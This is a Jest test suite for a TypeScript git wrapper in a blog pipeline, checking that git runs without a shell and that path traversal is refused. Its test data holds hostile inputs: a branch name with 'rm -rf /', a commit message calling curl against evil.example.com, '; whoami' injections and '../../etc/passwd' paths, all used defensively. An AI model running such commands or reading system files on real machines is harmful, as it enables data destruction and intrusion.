import { beforeEach, describe, expect, it, jest } from "@jest/globals";

/*
 * The git wrapper behind the blog pipeline (Home/Jobs/UpdateBlog.ts and
 * Home/Utils/BlogPost.ts), and the shared helper anything else that touches a
 * checkout would reach for next.
 *
 * Two properties are worth pinning here, and neither is visible by reading a
 * single method:
 *
 * 1. NOTHING GOES THROUGH A SHELL. Every git invocation is made through
 *    Execute.executeCommandFile with an ARGUMENT ARRAY, so a branch name, a
 *    commit message or a file path containing `;`, backticks or `$(...)`
 *    reaches git as one opaque argument rather than as syntax. That is the
 *    whole defence -- there is no escaping layer to get right, because there
 *    is no shell to escape for -- which is exactly why it needs a test: the
 *    property is preserved by a call shape, and a future method written with
 *    `executeCommand` and a template string would silently drop it while
 *    looking perfectly reasonable.
 *
 * 2. THE PATH HELPERS THAT GUARD, GUARD. `resolvePathWithinRepo` refuses a
 *    path that resolves outside the repository root. The methods that route
 *    through it must keep doing so, because the argument is otherwise handed
 *    straight to git or to the filesystem.
 *
 * The suite also covers the parsing that has no other check on it: the clone
 * folder name derived from a URL, and the record/unit separated `git log`
 * output that the contributors list is built from.
 */

jest.mock("../../../Server/Utils/Execute", () => {
  return {
    __esModule: true,
    default: {
      executeCommandFile: jest.fn(),
      executeCommand: jest.fn(),
    },
  };
});

jest.mock("../../../Server/Utils/LocalFile", () => {
  return {
    __esModule: true,
    default: {
      /* The real one only collapses double slashes; keep that behaviour. */
      sanitizeFilePath: (filePath: string): string => {
        return filePath.replace(/\/\//g, "/");
      },
      read: jest.fn(),
      write: jest.fn(),
      makeDirectory: jest.fn(),
      deleteFile: jest.fn(),
      deleteDirectory: jest.fn(),
      readDirectory: jest.fn(),
    },
  };
});

jest.mock("../../../Server/Utils/Logger", () => {
  return {
    __esModule: true,
    default: {
      debug: jest.fn(),
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
    },
    getLogAttributesFromRequest: jest.fn().mockReturnValue({}),
  };
});

import CodeRepositoryUtil from "../../../Server/Utils/CodeRepository/CodeRepository";
import Execute from "../../../Server/Utils/Execute";
import LocalFile from "../../../Server/Utils/LocalFile";
import path from "path";

type MockedFn = ReturnType<typeof jest.fn>;

const executeCommandFileMock: MockedFn =
  Execute.executeCommandFile as unknown as MockedFn;
const executeCommandMock: MockedFn =
  Execute.executeCommand as unknown as MockedFn;
const readMock: MockedFn = LocalFile.read as unknown as MockedFn;
const writeMock: MockedFn = LocalFile.write as unknown as MockedFn;
const deleteFileMock: MockedFn = LocalFile.deleteFile as unknown as MockedFn;
const readDirectoryMock: MockedFn =
  LocalFile.readDirectory as unknown as MockedFn;

const REPO_PATH: string = "/tmp/oneuptime-test-repo";

interface ExecuteCall {
  command: string;
  args: Array<string>;
  cwd: string;
  maxBuffer?: number;
  timeoutInMS?: number;
}

const callsTo: () => Array<ExecuteCall> = (): Array<ExecuteCall> => {
  return executeCommandFileMock.mock.calls.map((call: Array<unknown>) => {
    return call[0] as ExecuteCall;
  });
};

const lastCall: () => ExecuteCall = (): ExecuteCall => {
  const calls: Array<ExecuteCall> = callsTo();

  return calls[calls.length - 1] as ExecuteCall;
};

describe("CodeRepositoryUtil", () => {
  beforeEach(() => {
    jest.clearAllMocks();
    executeCommandFileMock.mockResolvedValue("" as never);
    readMock.mockResolvedValue("" as never);
    writeMock.mockResolvedValue(undefined as never);
    readDirectoryMock.mockResolvedValue([] as never);
  });

  describe("every git call avoids the shell", () => {
    /*
     * The single most important assertion in the file. executeCommand runs a
     * string through a shell; executeCommandFile spawns the binary with an
     * argv array. If a method ever switches, metacharacters in a branch name
     * or a commit message stop being data.
     */
    it("never reaches for the shell-executing helper", async () => {
      await CodeRepositoryUtil.getCurrentCommitHash({ repoPath: REPO_PATH });
      await CodeRepositoryUtil.addAllChangedFilesToGit({ repoPath: REPO_PATH });
      await CodeRepositoryUtil.pullChanges({ repoPath: REPO_PATH });
      await CodeRepositoryUtil.checkoutBranch({
        repoPath: REPO_PATH,
        branchName: "main",
      });
      await CodeRepositoryUtil.commitChanges({
        repoPath: REPO_PATH,
        message: "hello",
      });

      expect(executeCommandMock).not.toHaveBeenCalled();
      expect(executeCommandFileMock).toHaveBeenCalled();
    });

    it("always invokes the git binary by name", async () => {
      await CodeRepositoryUtil.getCurrentCommitHash({ repoPath: REPO_PATH });
      await CodeRepositoryUtil.discardAllChangesOnCurrentBranch({
        repoPath: REPO_PATH,
      });

      for (const call of callsTo()) {
        expect(call.command).toBe("git");
        expect(Array.isArray(call.args)).toBe(true);
      }
    });

    it("passes a hostile branch name as one opaque argument", async () => {
      const hostile: string = "main; rm -rf /";

      await CodeRepositoryUtil.checkoutBranch({
        repoPath: REPO_PATH,
        branchName: hostile,
      });

      expect(lastCall().args).toEqual(["checkout", hostile]);
    });

    it("passes a hostile commit message as one opaque argument", async () => {
      const hostile: string = '$(curl evil.example.com) `id` "quoted"';

      await CodeRepositoryUtil.commitChanges({
        repoPath: REPO_PATH,
        message: hostile,
      });

      expect(lastCall().args).toEqual(["commit", "-m", hostile]);
    });

    it("passes a hostile author identity as opaque arguments", async () => {
      await CodeRepositoryUtil.setAuthorIdentity({
        repoPath: REPO_PATH,
        authorName: "a; whoami",
        authorEmail: "b@example.com; whoami",
      });

      const calls: Array<ExecuteCall> = callsTo();

      expect(calls[0]?.args).toEqual([
        "config",
        "--global",
        "user.name",
        "a; whoami",
      ]);
      expect(calls[1]?.args).toEqual([
        "config",
        "--global",
        "user.email",
        "b@example.com; whoami",
      ]);
    });

    it("runs git from the resolved repository directory", async () => {
      await CodeRepositoryUtil.pullChanges({ repoPath: REPO_PATH });

      expect(lastCall().cwd).toBe(path.resolve(REPO_PATH));
    });
  });

  describe("command shapes", () => {
    it("reads the current commit with rev-parse HEAD", async () => {
      executeCommandFileMock.mockResolvedValue("abc123\n" as never);

      await CodeRepositoryUtil.getCurrentCommitHash({ repoPath: REPO_PATH });

      expect(lastCall().args).toEqual(["rev-parse", "HEAD"]);
    });

    it("stages everything with add -A", async () => {
      await CodeRepositoryUtil.addAllChangedFilesToGit({ repoPath: REPO_PATH });

      expect(lastCall().args).toEqual(["add", "-A"]);
    });

    it("discards working-tree changes with checkout .", async () => {
      await CodeRepositoryUtil.discardChanges({ repoPath: REPO_PATH });

      expect(lastCall().args).toEqual(["checkout", "."]);
    });

    it("creates a branch with checkout -b", async () => {
      await CodeRepositoryUtil.createBranch({
        repoPath: REPO_PATH,
        branchName: "feature",
      });

      expect(lastCall().args).toEqual(["checkout", "-b", "feature"]);
    });
  });

  describe("createOrCheckoutBranch", () => {
    /*
     * The decision is made by whether `rev-parse --verify` throws, so a
     * checkout that fails for a reason other than "no such branch" would end
     * up creating one. Both directions are pinned.
     */
    it("checks out a branch that already exists", async () => {
      executeCommandFileMock.mockResolvedValue("hash" as never);

      await CodeRepositoryUtil.createOrCheckoutBranch({
        repoPath: REPO_PATH,
        branchName: "existing",
      });

      const calls: Array<ExecuteCall> = callsTo();

      expect(calls[0]?.args).toEqual(["rev-parse", "--verify", "existing"]);
      expect(calls[1]?.args).toEqual(["checkout", "existing"]);
      expect(calls).toHaveLength(2);
    });

    it("creates a branch that does not exist yet", async () => {
      executeCommandFileMock
        .mockRejectedValueOnce(new Error("unknown revision") as never)
        .mockResolvedValue("" as never);

      await CodeRepositoryUtil.createOrCheckoutBranch({
        repoPath: REPO_PATH,
        branchName: "brand-new",
      });

      expect(lastCall().args).toEqual(["checkout", "-b", "brand-new"]);
    });
  });

  describe("cloneRepository", () => {
    it("clones the URL it was given", async () => {
      await CodeRepositoryUtil.cloneRepository({
        repoPath: REPO_PATH,
        repoUrl: "https://github.com/OneUptime/oneuptime.git",
      });

      expect(lastCall().args).toEqual([
        "clone",
        "https://github.com/OneUptime/oneuptime.git",
      ]);
    });

    it("derives the folder name from an https URL", async () => {
      await expect(
        CodeRepositoryUtil.cloneRepository({
          repoPath: REPO_PATH,
          repoUrl: "https://github.com/OneUptime/oneuptime.git",
        }),
      ).resolves.toBe("oneuptime");
    });

    it("derives the folder name from an https URL with no .git suffix", async () => {
      await expect(
        CodeRepositoryUtil.cloneRepository({
          repoPath: REPO_PATH,
          repoUrl: "https://github.com/OneUptime/oneuptime",
        }),
      ).resolves.toBe("oneuptime");
    });

    it("ignores a trailing slash", async () => {
      await expect(
        CodeRepositoryUtil.cloneRepository({
          repoPath: REPO_PATH,
          repoUrl: "https://github.com/OneUptime/oneuptime/",
        }),
      ).resolves.toBe("oneuptime");
    });

    it("derives the folder name from an scp-style SSH URL", async () => {
      await expect(
        CodeRepositoryUtil.cloneRepository({
          repoPath: REPO_PATH,
          repoUrl: "git@github.com:OneUptime/oneuptime.git",
        }),
      ).resolves.toBe("oneuptime");
    });

    it("strips the .git suffix case-insensitively", async () => {
      await expect(
        CodeRepositoryUtil.cloneRepository({
          repoPath: REPO_PATH,
          repoUrl: "https://github.com/OneUptime/oneuptime.GIT",
        }),
      ).resolves.toBe("oneuptime");
    });

    /*
     * Returning "" here would have the caller build paths against the repo
     * root itself, so this fails loudly instead.
     */
    it("refuses a URL it cannot derive a folder name from", async () => {
      await expect(
        CodeRepositoryUtil.cloneRepository({
          repoPath: REPO_PATH,
          repoUrl: "/",
        }),
      ).rejects.toThrow("Unable to determine repository folder name");
    });
  });

  describe("paths that are guarded", () => {
    /*
     * These three route through resolvePathWithinRepo, so a path that escapes
     * the repository is refused rather than handed to git or to the
     * filesystem.
     */
    /*
     * getFileContent is not `async`, so the guard throws SYNCHRONOUSLY out of
     * the call rather than rejecting the promise it would otherwise return.
     * Asserting it as a rejection would pass whether or not the guard fired,
     * because the throw escapes before there is a promise to reject.
     */
    it("refuses to read a file outside the repository", () => {
      expect(() => {
        return CodeRepositoryUtil.getFileContent({
          repoPath: REPO_PATH,
          filePath: "../../etc/passwd",
        });
      }).toThrow("File path is outside the repository");

      expect(readMock).not.toHaveBeenCalled();
    });

    it("refuses to stage a file outside the repository", async () => {
      await expect(
        CodeRepositoryUtil.addFilesToGit({
          repoPath: REPO_PATH,
          filePaths: ["../../etc/passwd"],
        }),
      ).rejects.toThrow("File path is outside the repository");

      expect(executeCommandFileMock).not.toHaveBeenCalled();
    });

    it("refuses to log a file outside the repository", async () => {
      await expect(
        CodeRepositoryUtil.getGitCommitHashForFile({
          repoPath: REPO_PATH,
          filePath: "../../etc/passwd",
        }),
      ).rejects.toThrow("File path is outside the repository");
    });

    it("reads a file inside the repository from its absolute path", async () => {
      readMock.mockResolvedValue("contents" as never);

      await expect(
        CodeRepositoryUtil.getFileContent({
          repoPath: REPO_PATH,
          filePath: "posts/hello.md",
        }),
      ).resolves.toBe("contents");

      expect(readMock).toHaveBeenCalledWith(
        path.resolve(REPO_PATH, "posts/hello.md"),
      );
    });

    /*
     * A traversal that lands back inside the repository is not an escape, and
     * refusing it would break a legitimate relative path.
     */
    it("allows a traversal that resolves back inside the repository", async () => {
      readMock.mockResolvedValue("contents" as never);

      await expect(
        CodeRepositoryUtil.getFileContent({
          repoPath: REPO_PATH,
          filePath: "posts/../posts/hello.md",
        }),
      ).resolves.toBe("contents");
    });
  });

  describe("addFilesToGit", () => {
    it("stages paths relative to the repository root", async () => {
      await CodeRepositoryUtil.addFilesToGit({
        repoPath: REPO_PATH,
        filePaths: ["posts/a.md", "posts/b.md"],
      });

      expect(lastCall().args).toEqual(["add", "posts/a.md", "posts/b.md"]);
    });

    it("accepts a leading slash as repository-relative", async () => {
      await CodeRepositoryUtil.addFilesToGit({
        repoPath: REPO_PATH,
        filePaths: ["/posts/a.md"],
      });

      expect(lastCall().args).toEqual(["add", "posts/a.md"]);
    });

    it("skips blank paths", async () => {
      await CodeRepositoryUtil.addFilesToGit({
        repoPath: REPO_PATH,
        filePaths: ["   ", "posts/a.md"],
      });

      expect(lastCall().args).toEqual(["add", "posts/a.md"]);
    });

    /*
     * `git add` with no pathspec is not a no-op -- it is an error in older git
     * and a full-tree stage in some configurations. Skipping the call is the
     * only safe answer.
     */
    it("does not run git at all when nothing is left to stage", async () => {
      await CodeRepositoryUtil.addFilesToGit({
        repoPath: REPO_PATH,
        filePaths: ["", "   "],
      });

      expect(executeCommandFileMock).not.toHaveBeenCalled();
    });

    it("does not run git for an empty list", async () => {
      await CodeRepositoryUtil.addFilesToGit({
        repoPath: REPO_PATH,
        filePaths: [],
      });

      expect(executeCommandFileMock).not.toHaveBeenCalled();
    });
  });

  describe("getGitCommitHashForFile", () => {
    it("asks git for the last commit touching that path", async () => {
      executeCommandFileMock.mockResolvedValue("deadbeef\n" as never);

      await expect(
        CodeRepositoryUtil.getGitCommitHashForFile({
          repoPath: REPO_PATH,
          filePath: "posts/hello.md",
        }),
      ).resolves.toBe("deadbeef");

      expect(lastCall().args).toEqual([
        "log",
        "-1",
        "--pretty=format:%H",
        "./posts/hello.md",
      ]);
    });

    /*
     * The `./` prefix is what stops git reading a path that happens to match a
     * ref name as a revision instead of a file.
     */
    it("prefixes the pathspec so git cannot read it as a revision", async () => {
      executeCommandFileMock.mockResolvedValue("hash" as never);

      await CodeRepositoryUtil.getGitCommitHashForFile({
        repoPath: REPO_PATH,
        filePath: "main",
      });

      expect(lastCall().args[3]).toBe("./main");
    });
  });

  describe("getCommitAuthorsWithFiles", () => {
    const RECORD: string = "\x1e";
    const UNIT: string = "\x1f";

    it("asks for non-merge commits with names only", async () => {
      executeCommandFileMock.mockResolvedValue("" as never);

      await CodeRepositoryUtil.getCommitAuthorsWithFiles({
        repoPath: REPO_PATH,
      });

      expect(lastCall().args).toEqual([
        "log",
        "--no-merges",
        `--pretty=format:${RECORD}%an${UNIT}%ae`,
        "--name-only",
      ]);
    });

    /*
     * A pathspec has to come after `--`, or a directory whose name matches a
     * branch is read as a revision.
     */
    it("separates a pathspec from the revision arguments", async () => {
      executeCommandFileMock.mockResolvedValue("" as never);

      await CodeRepositoryUtil.getCommitAuthorsWithFiles({
        repoPath: REPO_PATH,
        path: "posts",
      });

      const args: Array<string> = lastCall().args;

      expect(args[args.length - 2]).toBe("--");
      expect(args[args.length - 1]).toBe("posts");
    });

    it("raises the output buffer past the default", async () => {
      executeCommandFileMock.mockResolvedValue("" as never);

      await CodeRepositoryUtil.getCommitAuthorsWithFiles({
        repoPath: REPO_PATH,
      });

      expect(lastCall().maxBuffer).toBeGreaterThan(1024 * 1024);
    });

    it("passes a timeout through when one is given", async () => {
      executeCommandFileMock.mockResolvedValue("" as never);

      await CodeRepositoryUtil.getCommitAuthorsWithFiles({
        repoPath: REPO_PATH,
        timeoutInMS: 5000,
      });

      expect(lastCall().timeoutInMS).toBe(5000);
    });

    it("omits the timeout entirely when none is given", async () => {
      executeCommandFileMock.mockResolvedValue("" as never);

      await CodeRepositoryUtil.getCommitAuthorsWithFiles({
        repoPath: REPO_PATH,
      });

      expect(lastCall()).not.toHaveProperty("timeoutInMS");
    });

    it("parses author and files out of one commit", async () => {
      executeCommandFileMock.mockResolvedValue(
        `${RECORD}Ada Lovelace${UNIT}ada@example.com\nposts/a.md\nposts/b.md\n` as never,
      );

      await expect(
        CodeRepositoryUtil.getCommitAuthorsWithFiles({ repoPath: REPO_PATH }),
      ).resolves.toEqual([
        {
          authorName: "Ada Lovelace",
          authorEmail: "ada@example.com",
          files: ["posts/a.md", "posts/b.md"],
        },
      ]);
    });

    it("parses several commits", async () => {
      executeCommandFileMock.mockResolvedValue(
        (`${RECORD}A${UNIT}a@example.com\nx.md\n` +
          (`${RECORD}B${UNIT}b@example.com\ny.md\n` as string)) as never,
      );

      const commits: Array<{ authorName: string }> =
        await CodeRepositoryUtil.getCommitAuthorsWithFiles({
          repoPath: REPO_PATH,
        });

      expect(commits).toHaveLength(2);
      expect(commits[0]?.authorName).toBe("A");
      expect(commits[1]?.authorName).toBe("B");
    });

    it("keeps a commit that changed no files", async () => {
      executeCommandFileMock.mockResolvedValue(
        `${RECORD}A${UNIT}a@example.com\n` as never,
      );

      await expect(
        CodeRepositoryUtil.getCommitAuthorsWithFiles({ repoPath: REPO_PATH }),
      ).resolves.toEqual([
        { authorName: "A", authorEmail: "a@example.com", files: [] },
      ]);
    });

    it("returns nothing for an empty log", async () => {
      executeCommandFileMock.mockResolvedValue("" as never);

      await expect(
        CodeRepositoryUtil.getCommitAuthorsWithFiles({ repoPath: REPO_PATH }),
      ).resolves.toEqual([]);
    });

    it("survives a header with no email", async () => {
      executeCommandFileMock.mockResolvedValue(
        `${RECORD}OnlyName\nx.md\n` as never,
      );

      await expect(
        CodeRepositoryUtil.getCommitAuthorsWithFiles({ repoPath: REPO_PATH }),
      ).resolves.toEqual([
        { authorName: "OnlyName", authorEmail: "", files: ["x.md"] },
      ]);
    });
  });

  describe("filesystem helpers", () => {
    it("writes a file under the repository path", async () => {
      await CodeRepositoryUtil.writeToFile({
        repoPath: REPO_PATH,
        filePath: "posts/a.md",
        content: "body",
      });

      expect(writeMock).toHaveBeenCalledWith(`${REPO_PATH}/posts/a.md`, "body");
    });

    /*
     * The repo path and the file path are joined with a slash, so a file path
     * that already starts with one would otherwise produce a doubled
     * separator.
     */
    it("collapses the doubled separator from a rooted file path", async () => {
      await CodeRepositoryUtil.writeToFile({
        repoPath: REPO_PATH,
        filePath: "/posts/a.md",
        content: "body",
      });

      expect(writeMock).toHaveBeenCalledWith(`${REPO_PATH}/posts/a.md`, "body");
    });

    it("deletes a file under the repository path", async () => {
      await CodeRepositoryUtil.deleteFile({
        repoPath: REPO_PATH,
        filePath: "posts/a.md",
      });

      expect(deleteFileMock).toHaveBeenCalledWith(`${REPO_PATH}/posts/a.md`);
    });

    it("lists a directory by entry name", async () => {
      readDirectoryMock.mockResolvedValue([
        { name: "a.md" },
        { name: "b.md" },
      ] as never);

      await expect(
        CodeRepositoryUtil.listFilesInDirectory({
          repoPath: REPO_PATH,
          directoryPath: "posts",
        }),
      ).resolves.toEqual(["a.md", "b.md"]);
    });
  });
});
